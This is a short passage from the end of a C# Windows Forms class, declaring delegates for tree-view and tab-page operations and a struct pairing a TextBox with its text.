        private delegate int GetTreeCount(string TreeInfo);

        private delegate void RemoveTab(TabPage TabName);

        private delegate bool TreeChecked(string TreeInfo);

        [StructLayout(LayoutKind.Sequential)]
        public struct TxtBoxInfo
        {
            public TextBox txtBox;
            public string Text;
        }
    }
}

